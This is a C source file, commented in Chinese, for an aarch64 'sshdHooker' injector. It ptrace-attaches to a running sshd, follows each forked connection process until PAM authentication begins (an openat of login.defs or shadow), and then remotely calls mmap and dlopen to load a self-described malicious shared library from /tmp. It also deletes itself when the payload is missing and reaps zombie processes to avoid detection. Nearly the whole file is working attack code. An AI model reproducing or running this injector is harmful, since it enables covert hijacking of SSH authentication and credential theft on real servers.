/*
 * sshdHooker 注入器 (aarch64)
 *
 * 整体流程与 x86_64 版一致:
 *   1. main: attach 到 sshd 主进程, 监控 clone(220) 调用,
 *      每次 sshd fork 出处理连接的子进程时, 创建一个 pthread 去跟踪它
 *   2. wait_for_libpam 线程: attach 到 sshd 子进程, 等它 openat(56)
 *      "login.defs"(进入 PAM 认证阶段的特征)时执行注入
 *   3. inject_shellcode: 远程调用 mmap 分配内存后, 直接远程调用
 *      dlopen 加载恶意 so(aarch64 上不需要走 shellcode)
 *   4. manual_gc: 子进程退出后, 在 sshd 主进程内远程调用 waitpid
 *      回收僵尸子进程(修复 ptrace 接管后 sshd 自身无法回收子进程的问题)
 *
 * 编译: gcc sshdHooker.c -g -o inject -ldl -lpthread
 * 用法: sudo ./inject <sshd_pid>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <dlfcn.h>
#include <link.h>
#include <asm/ptrace.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>

/*
 * aarch64 兼容层: 统一用 ARM_xx 的方式访问 user_pt_regs 中的字段,
 * 使代码写法与 32 位 ARM 一致.
 */
#define pt_regs    user_pt_regs
#define uregs      regs
#define ARM_pc     pc
#define ARM_sp     sp
#define ARM_cpsr   pstate
#define ARM_lr     regs[30]
#define ARM_r0     regs[0]
#define ARM_r1     regs[1]
/* aarch64 没有 PTRACE_GETREGS/SETREGS, 用 REGSET 系列代替 */
#ifndef PTRACE_GETREGS
#define PTRACE_GETREGS PTRACE_GETREGSET
#endif
#ifndef PTRACE_SETREGS
#define PTRACE_SETREGS PTRACE_SETREGSET
#endif
#define CPSR_T_MASK (1u << 5) /* Thumb 状态标志位 */

/* 恶意 so 落盘路径, 注入时写入目标进程供 dlopen 使用 */
char evil_so_path[] = "/tmp/hello.so";

/*
 * 在 /proc/pid/maps 中匹配 libc 的特征串.
 * 预留较大空间: 找不到 "libc-" 时会 strcpy 成 "libc.so" (原长度不够会越界).
 */
char libc_pattern[64] = "libc-";

/*
 * 待回收子进程的链式栈.
 * wait_for_libpam 线程在子进程退出后把节点压栈(prev 指向原栈顶),
 * main 循环检测到栈顶不是哨兵节点时, 执行 manual_gc 并弹栈.
 */
struct gc_stack {
    struct gc_stack *prev;
    pid_t target_pid;
} *gc_stack_top;

/* ======================= ptrace 基础封装 ======================= */

/* 在 ptrace_call 中会被提前调用, 先做前向声明 */
int ptrace_getregs(pid_t pid, struct pt_regs *regs);
int ptrace_setregs(pid_t pid, struct pt_regs *regs);
int ptrace_continue(pid_t pid);

/* 按 word 读取目标进程内存(当前未使用, 保留作调试工具) */
int ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
{
    int bytes_read = 0;
    int i = 0;
    long word = 0;
    unsigned long *ptr = (unsigned long *)data;

    while (bytes_read < len) {
        word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytes_read, NULL);
        if (word == -1) {
            fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
            return 1;
        }
        bytes_read += sizeof(long);
        if (bytes_read > len) {
            /* 末尾不足一个 word, 只拷贝有效字节 */
            memcpy(ptr + i, &word, sizeof(long) - (bytes_read - len));
            break;
        }
        ptr[i++] = word;
    }

    return 0;
}

/* 按 4 字节为单位将目标进程内存读入 buf */
int ptrace_readdata(pid_t pid, uint8_t *src, uint8_t *buf, size_t size)
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    /* 利用 union 以 long 对齐读取, 再按字节拷贝, 规避对齐问题 */
    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;

    laddr = buf;

    for (i = 0; i < j; i++) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
        memcpy(laddr, d.chars, 4);
        src += 4;
        laddr += 4;
    }

    if (remain > 0) {
        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
        memcpy(laddr, d.chars, remain);
    }

    return 0;
}

/* 按 4 字节为单位把 data 写入目标进程内存, 末尾先读后写避免覆盖多余字节 */
int ptrace_writedata(pid_t pid, uint8_t *dest, uint8_t *data, size_t size)
{
    uint32_t i, j, remain;
    uint8_t *laddr;

    union u {
        long val;
        char chars[sizeof(long)];
    } d;

    j = size / 4;
    remain = size % 4;

    laddr = data;

    for (i = 0; i < j; i++) {
        memcpy(d.chars, laddr, 4);
        ptrace(PTRACE_POKETEXT, pid, dest, d.val);

        dest += 4;
        laddr += 4;
    }

    if (remain > 0) {
        /* 不足 4 字节的部分: 先读出一个 word, 改写有效字节后写回 */
        d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, 0);
        for (i = 0; i < remain; i++) {
            d.chars[i] = *laddr++;
        }

        ptrace(PTRACE_POKETEXT, pid, dest, d.val);
    }

    return 0;
}

/* 向目标进程写入一个字符串(含结尾 '\0') */
int ptrace_writestring(pid_t pid, uint8_t *dest, char *str)
{
    return ptrace_writedata(pid, dest, (uint8_t *)str, strlen(str) + 1);
}

/*
 * 在目标进程中远程调用 addr 处的函数.
 * 前 8 个参数通过 x0-x7 寄存器传递, 更多参数通过栈传递.
 */
int ptrace_call(pid_t pid, uint64_t addr, long *params, uint32_t num_params,
                struct pt_regs *regs, int is_trap)
{
    /* 多于 8 个的参数压栈 */
    if (num_params > 8) {
        regs->ARM_sp -= (num_params - 8) * sizeof(long);

        ptrace_writedata(pid, (uint8_t *)regs->ARM_sp, (uint8_t *)&params[6],
                         sizeof(long) * (num_params - 6));
    }

    /* 参数放入寄存器 */
    for (size_t i = 0; i < 8; i++) {
        regs->uregs[i] = params[i];
    }

    /* 跳转到目标函数; 根据 pc 最低位判断 arm/thumb 模式 */
    regs->ARM_pc = (unsigned long long)addr;
    if (regs->ARM_pc & 1) {
        regs->ARM_pc &= ~1;
        regs->ARM_cpsr |= CPSR_T_MASK;
    } else {
        regs->ARM_cpsr &= ~CPSR_T_MASK;
    }
    regs->ARM_lr = 0;

    ptrace_setregs(pid, regs);

    /* 持续运行直到目标进程陷入预期的 stop 状态 */
    int stat = 0;
    while (stat != 0xb7f) {
        ptrace_continue(pid);
        waitpid(pid, &stat, WUNTRACED);
    }

    ptrace_getregs(pid, regs);
    return 0;
}

/* aarch64 需要通过 PTRACE_GETREGSET + iovec 读写寄存器 */
int ptrace_getregs(pid_t pid, struct pt_regs *regs)
{
    struct iovec io;
    io.iov_base = regs;
    io.iov_len = sizeof(struct pt_regs);
    if (ptrace(PTRACE_GETREGS, pid, NT_PRSTATUS, &io) < 0) {
        printf("- [Getregs][%d] Can not get register values\n", pid);
        return -1;
    }

    return 0;
}

int ptrace_setregs(pid_t pid, struct pt_regs *regs)
{
    struct iovec io;
    io.iov_base = regs;
    io.iov_len = sizeof(struct pt_regs);
    if (ptrace(PTRACE_SETREGS, pid, NT_PRSTATUS, &io) < 0) {
        printf("- [Setregs][%d] Can not set register values\n", pid);
        return -1;
    }

    return 0;
}

int ptrace_continue(pid_t pid)
{
    if (ptrace(PTRACE_CONT, pid, NULL, 0) < 0) {
        perror("ptrace_cont");
        return -1;
    }

    return 0;
}

/* attach 并让目标进程停在系统调用入口, 随后可配合 PTRACE_SYSCALL 监听 */
int ptrace_attach(pid_t pid)
{
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        printf("- [Attach] Failed to attach: %d\n", pid);
        return -1;
    }
    int stat = 0;
    waitpid(pid, &stat, WUNTRACED);

    if (ptrace(PTRACE_SYSCALL, pid, NULL, 0) < 0) {
        perror("ptrace_syscall");
        return -1;
    }

    waitpid(pid, NULL, WUNTRACED);

    return 0;
}

int ptrace_detach(pid_t pid)
{
    if (ptrace(PTRACE_DETACH, pid, NULL, 0) < 0) {
        perror("ptrace_detach");
        return -1;
    }

    return 0;
}

/* ======================= 目标进程模块信息 ======================= */

/* 解析 /proc/pid/maps, 取目标进程 libc 的完整路径 */
void get_libc_path(pid_t pid, char *path)
{
    FILE *fp;
    char filename[32];
    char line[1024];

    if (pid < 0) {
        /* pid < 0 表示读取自身进程 */
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    fp = fopen(filename, "r");
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, libc_pattern)) {
                /* 行末最后一个空格之后即是 so 的绝对路径 */
                char *m = strrchr(line, ' ');
                char *tmp = strchr(m, '\n');
                *tmp = '\0';
                m = m + 1;
                strcpy(path, m);
                break;
            }
        }
        fclose(fp);
    }

    return;
}

/* 解析 /proc/pid/maps, 取 module_name 在目标进程中的加载基址 */
void *get_module_base(pid_t pid, const char *module_name)
{
    FILE *fp;
    long addr = 0;
    char *pch;
    char filename[32];
    char line[1024];

    if (pid < 0) {
        /* pid < 0 表示读取自身进程 */
        snprintf(filename, sizeof(filename), "/proc/self/maps");
    } else {
        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
    }

    fp = fopen(filename, "r");
    if (fp != NULL) {
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, module_name)) {
                /* 行首地址形如 "起始-结束", 取 '-' 前的起始地址 */
                pch = strtok(line, "-");
                addr = strtoul(pch, NULL, 16);

                if (addr == 0x8000) {
                    /* 0x8000 是静态 PIE 主程序在 maps 中的起始, 不是 so 基址 */
                    addr = 0;
                }

                break;
            }
        }
        fclose(fp);
    }

    return (void *)addr;
}

/*
 * 利用同一 so 在本进程与目标进程中的基址差, 把本进程内的地址
 * 换算成目标进程中的对应地址(同名 so 各进程内偏移一致).
 */
void *get_remote_addr(pid_t target_pid, const char *module_name, void *local_addr)
{
    void *local_base = get_module_base(-1, module_name);
    void *remote_base = get_module_base(target_pid, module_name);

    return (void *)((uint64_t)local_addr - (uint64_t)local_base + (uint64_t)remote_base);
}

/* ======================= 业务逻辑 ======================= */

/*
 * 在 sshd 主进程中远程循环调用 waitpid(-1, NULL, WNOHANG),
 * 回收因被注入/跟踪而遗留的僵尸子进程.
 */
void manual_gc(pid_t target_pid)
{
    struct pt_regs regs, original_regs;
    char libc_path[255];

    /*
     * 注意: 此处先用未初始化的 libc_path 去 dlopen, handle 通常为 NULL,
     * 而 dlsym(NULL, ...) 会转而搜索本进程的全局符号表, 因此仍能取到
     * 本进程 waitpid 的地址. 保持此调用顺序与原实现一致.
     */
    void *handle = dlopen(libc_path, RTLD_LAZY);
    get_libc_path(target_pid, libc_path);
    void *self_waitpid_addr = dlsym(handle, "waitpid");
    printf("+ [ManualGC][%d] Self waitpid address: %p\n", target_pid, self_waitpid_addr);
    void *waitpid_addr = get_remote_addr(target_pid, libc_pattern, self_waitpid_addr);
    printf("+ [ManualGC][%d] Remote waitpid address: %p\n", target_pid, waitpid_addr);

    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [ManualGC][%d] Getregs error, target: %d\n", target_pid, target_pid);
        return;
    }
    memcpy(&original_regs, &regs, sizeof(struct pt_regs));

    while (1) {
        long parameters[3];
        parameters[0] = -1; /* 任意子进程 */
        parameters[1] = 0;  /* 状态输出缓冲(wstatus 传 NULL) */
        parameters[2] = WNOHANG;
        if (ptrace_call(target_pid, (uint64_t)waitpid_addr, parameters, 3, &regs, 0) == -1) {
            printf("- [ManualGC][%d] Writedata error\n", target_pid);
            return;
        }
        ptrace_getregs(target_pid, &regs); /* r0 即 waitpid 返回值 */
        int retval = regs.ARM_r0;
        printf("+ [ManualGC][%d] waitpid = %ld\n", target_pid, (long)retval);
        if (retval == -1 || retval == 0 || retval == 4294967295) { /* 4294967295 == (unsigned)-1 */
            /* -1 出错 / 0 暂无已退出的子进程, 回收结束 */
            break;
        }
    }

    /* 恢复寄存器并让主进程继续运行 */
    ptrace_setregs(target_pid, &original_regs);
    ptrace_continue(target_pid);
}

/*
 * 向目标进程注入恶意 so:
 *   1. 远程调用 mmap 分配一块 RWX 匿名内存, 写入 so 路径字符串
 *   2. 直接远程调用 dlopen(so_path, RTLD_NOW) 完成加载
 *      (aarch64 上参数可直接通过寄存器传入, 无需 shellcode)
 */
int inject_shellcode(pid_t target_pid)
{
    struct pt_regs regs, original_regs;
    void *malloc_addr, *dlopen_mode_addr, *mmap_addr;
    uint8_t *remote_code_ptr;
    char libc_path[255];
    FILE *fp;

    /* 恶意 so 不存在时删除自身(注入器)并退出, 避免残留 */
    fp = fopen(evil_so_path, "r");
    if (fp == NULL) {
        printf("! [Inject][%d] Cannot find so file, exit and remove\n", target_pid);
        char buf[1024];
        int count = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
        if (count < 0 || count >= 1024) {
            exit(0);
        }
        buf[count] = '\0';
        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "rm %s", buf);
        system(cmd);
        exit(0);
    } else {
        fclose(fp);
    }

    if (ptrace_attach(target_pid) == -1) {
        printf("- [Inject][%d] inject attach failed\n", target_pid);
        return -1;
    }
    printf("+ [Inject][%d] Waiting for process...\n", target_pid);
    printf("+ [Inject][%d] Getting registers\n", target_pid);
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [Inject][%d] Getregs error\n", target_pid);
        return -1;
    }
    memcpy(&original_regs, &regs, sizeof(struct pt_regs));
    printf("+ [Inject][%d] Injecting shellcode at %p\n", target_pid, (void *)regs.ARM_pc);

    /* 优先按 "libc-" 匹配; 找不到再退化成 "libc.so"(musl 等环境) */
    void *libc_module_base = get_module_base(-1, libc_pattern);
    get_libc_path(target_pid, libc_path);
    if (libc_module_base == NULL) {
        printf("- [Inject][%d] Can't find libc-xxxx, try to find libc.so.x\n", target_pid);
        char tmp_libc[] = "libc.so";
        strcpy(libc_pattern, tmp_libc);
        libc_module_base = get_module_base(-1, libc_pattern);
        get_libc_path(target_pid, libc_path);
    }

    /* 在本进程解析 dlopen/malloc/mmap 的地址, 再换算成目标进程中的地址 */
    void *handle = dlopen(libc_path, RTLD_LAZY);
    void *self_dlopen_mode_addr = dlsym(handle, "dlopen");
    if (self_dlopen_mode_addr == NULL) {
        printf("- [Inject][%d] Can't find dlopen in libc, try to use __libc_dlopen_mode\n", target_pid);
        self_dlopen_mode_addr = dlsym(handle, "__libc_dlopen_mode");
    }
    void *self_malloc_addr = dlsym(handle, "malloc");
    void *self_mmap_addr = dlsym(handle, "mmap");
    malloc_addr = get_remote_addr(target_pid, libc_pattern, self_malloc_addr);
    mmap_addr = get_remote_addr(target_pid, libc_pattern, self_mmap_addr);
    dlopen_mode_addr = get_remote_addr(target_pid, libc_pattern, self_dlopen_mode_addr);

    printf("+ [Inject][%d] self libc module base: %p\n", target_pid, libc_module_base);
    printf("+ [Inject][%d] remote libc path: %s\n", target_pid, libc_path);
    printf("+ [Inject][%d] self dlopen base: %p\n", target_pid, self_dlopen_mode_addr);
    printf("+ [Inject][%d] remote malloc addr: %p\n", target_pid, malloc_addr);
    printf("+ [Inject][%d] remote mmap addr: %p local: %p\n", target_pid, mmap_addr, self_mmap_addr);
    printf("+ [Inject][%d] remote dlopen addr: %p\n", target_pid, dlopen_mode_addr);

    /* 远程调用 mmap(NULL, 0x4000, RWX, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0) */
    long parameters[10];
    parameters[0] = 0;                                   /* addr */
    parameters[1] = 0x4000;                              /* length */
    parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  /* prot */
    parameters[3] = MAP_ANONYMOUS | MAP_PRIVATE;         /* flags */
    parameters[4] = 0;                                   /* fd */
    parameters[5] = 0;                                   /* offset */

    if (ptrace_call(target_pid, (uint64_t)mmap_addr, parameters, 6, &regs, 0) == -1) {
        printf("- [Inject][%d] Writedata error\n", target_pid);
        return -1;
    }
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [Inject][%d] Getregs error\n", target_pid);
        return -1;
    }
    printf("+ [Inject][%d] mmap result: %p\n", target_pid, (void *)regs.ARM_r0);

    /* 先把 so 路径字符串写进 mmap 内存开头 */
    remote_code_ptr = (uint8_t *)regs.ARM_r0;
    ptrace_writedata(target_pid, remote_code_ptr, (uint8_t *)evil_so_path, strlen(evil_so_path) + 1);
    printf("+ [Inject][%d] Writing evil so path at: %p\n", target_pid, remote_code_ptr);

    /* 远程调用 dlopen(so_path, RTLD_NOW) 完成注入 */
    parameters[0] = (long)remote_code_ptr; /* 第一个参数: so 路径地址 */
    parameters[1] = 0x2;                   /* 第二个参数: RTLD_NOW */
    if (ptrace_call(target_pid, (uint64_t)dlopen_mode_addr, parameters, 2, &regs, 0) == -1) {
        printf("- [Inject][%d] Writedata error\n", target_pid);
        return -1;
    }
    remote_code_ptr += strlen(evil_so_path) + 1;

    /* 注入完成, 恢复原始寄存器并让子进程继续正常运行 */
    printf("+ [Inject][%d] EvilSo injected. Recovering the regs...\n", target_pid);
    ptrace_setregs(target_pid, &original_regs);

    ptrace_continue(target_pid);

    return 0;
}

/*
 * PAM 流程特征文件: 子进程 openat 命中任意一个即触发注入.
 * 时机约束: 需在 pam_unix.so 加载之后、pam_set_data 回填认证结果之前.
 *   - login.defs: 由 pam_umask(session 阶段)读取,
 *     Ubuntu 系 / EL 系 / Debian13+ 的默认 PAM 栈自带该模块
 *   - shadow:     由 pam_unix 认证阶段读取,
 *     覆盖 Debian 11/12 等默认栈不含 pam_umask 的环境
 */
static const char *trigger_files[] = { "login.defs", "shadow", NULL };

static int hit_trigger(const char *path)
{
    for (int i = 0; trigger_files[i] != NULL; i++) {
        if (strstr(path, trigger_files[i])) {
            return 1;
        }
    }
    return 0;
}

/*
 * sshd 子进程跟踪线程入口:
 * attach 到 fork 出的 sshd 子进程, 监听其系统调用,
 * 等它 openat 命中 PAM 流程特征文件(见 trigger_files)时注入恶意 so.
 * 注入后继续等待子进程退出, 并将其压入 gc 栈等待 main 线程回收.
 */
int wait_for_libpam(pid_t target_pid)
{
    struct pt_regs regs;

    if (ptrace_attach(target_pid) == -1) {
        printf("- [WaitforLibPAM][%d] attach failed\n", target_pid);
        return -1;
    }
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [WaitforLibPAM][%d] Getregs error\n", target_pid);
        return -1;
    }

    char *path = malloc(255);

    while (1) {
        ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
        waitpid(target_pid, NULL, WUNTRACED);
        if (ptrace_getregs(target_pid, &regs) == -1) {
            return -1;
        }

        long num = regs.regs[8]; /* 系统调用号保存在 x8 */
        /* regs[7] 在系统调用前为 0, 调用完成后为 1, 用于只处理调用出口 */
        if (regs.regs[7] == 1 && num == 56) { /* openat 在 arm64 上的调用号为 56, 路径参数在 x1 */
            ptrace_readdata(target_pid, (uint8_t *)regs.ARM_r1, (uint8_t *)path, 255);
            if (hit_trigger(path)) {
                printf("+ [WaitforLibPAM][%d] SubProcess: openat find path: %s\n", target_pid, path);
                ptrace_detach(target_pid);
                inject_shellcode(target_pid);
                break;
            }
        }
        /* arm64 没有 open 系统调用, 无需处理 */
    }

    /* 子进程处理完连接退出后, 压栈等待 main 线程 manual_gc 回收 */
    printf("+ [WaitforLibPAM][%d] Wait child process ending\n", target_pid);
    waitpid(target_pid, NULL, 0);
    struct gc_stack node;
    node.prev = gc_stack_top;
    node.target_pid = target_pid;
    gc_stack_top = &node;

    printf("+ [WaitforLibPAM][%d] GC commit and child process end successful\n", target_pid);
    return 0;
}

/* pthread 线程包装: 参数以指针形式传入的是子进程 pid */
static void *watch_child_thread(void *arg)
{
    wait_for_libpam((pid_t)(long)arg);
    return NULL;
}

int main(int argc, char const *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <sshd_pid>\n", argv[0]);
        return -1;
    }

    pid_t target_pid = atoi(argv[1]);
    struct pt_regs regs;

    if (ptrace_attach(target_pid) == -1) {
        printf("- [Main][%d] Attach failed\n", target_pid);
        return -1;
    }
    printf("+ [Main][%d] Waiting for process...\n", target_pid);
    printf("+ [Main][%d] Getting registers\n", target_pid);
    if (ptrace_getregs(target_pid, &regs) == -1) {
        printf("- [Main][%d] Getregs error\n", target_pid);
        return -1;
    }
    printf("+ [Main][%d] RAX is %p\n", target_pid, (void *)regs.ARM_r0);

    /* 初始化 gc 栈的哨兵栈底 */
    struct gc_stack bottom;
    bottom.prev = NULL;
    bottom.target_pid = 0;
    gc_stack_top = &bottom;

    printf("+ [Main][%d] Initialization stack successful\n", target_pid);

    while (1) {
        /* 栈顶不是哨兵节点说明有线程提交了待回收的子进程 */
        if (gc_stack_top->prev != NULL) {
            printf("+ [Main][%d] ManualGC start\n", target_pid);
            manual_gc(target_pid);
            gc_stack_top = gc_stack_top->prev;
            printf("+ [Main][%d] ManualGC end\n------------------------------------\n", target_pid);
        }

        ptrace(PTRACE_SYSCALL, target_pid, NULL, 0);
        waitpid(target_pid, NULL, WUNTRACED);

        pthread_t tid;
        ptrace_getregs(target_pid, &regs);
        /* regs[7] 在系统调用前为 0, 调用完成后为 1; 调用号保存在 x8 */
        long num = regs.regs[8];
        if (regs.regs[7] == 1 && num == 220) { /* clone: sshd fork 出处理连接的子进程, r0 为子进程 pid */
            printf("+ [Main][%d] Process maybe = %ld\n", target_pid, (long)regs.ARM_r0);
            long child_pid = regs.ARM_r0;
            if (child_pid > 0) {
                /* 起线程去跟踪子进程, pid 通过指针参数传递 */
                pthread_create(&tid, NULL, watch_child_thread, (void *)child_pid);
            }
        }
    }

    return 0;
}
